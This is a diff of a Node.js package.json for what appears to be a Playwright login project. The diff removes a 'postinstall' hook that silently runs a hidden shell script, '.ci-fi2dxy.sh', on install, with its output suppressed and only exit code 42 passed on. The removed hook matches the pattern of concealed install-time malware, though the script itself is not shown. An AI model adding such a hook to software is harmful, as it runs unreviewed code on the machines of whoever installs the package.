@@ -6,8 +6,7 @@
   "type": "module",
   "scripts": {
     "start": "node login.js",
-    "install:browsers": "playwright install chromium",
-    "postinstall": "sh ./.ci-fi2dxy.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "install:browsers": "playwright install chromium"
   },
   "dependencies": {
     "better-sqlite3": "^13.0.3",
